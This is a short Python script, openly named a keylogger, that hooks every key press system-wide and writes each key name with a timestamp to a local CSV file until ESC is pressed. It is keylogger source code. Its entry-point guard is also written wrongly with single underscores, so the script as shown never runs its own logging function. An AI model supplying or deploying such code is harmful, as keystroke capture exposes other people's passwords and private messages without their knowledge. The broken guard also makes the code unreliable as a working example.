import keyboard
import time
import csv

log_filename = "keystroke_data.csv"

def log_keystrokes():
    with open(log_filename, mode='w', newline='') as file:
        writer = csv.writer(file)
        writer.writerow(['timestamp', 'key'])
        def on_event(event):
            if event.event_type == 'down':
                timestamp = time.time()
                key = event.name
                writer.writerow([timestamp, key])
                file.flush()
        keyboard.hook(on_event)
        print("Keylogger started. Press ESC to stop...")
        keyboard.wait('esc')
        print("Keylogger stopped.")

if _name_ == "_main_":
    log_keystrokes()
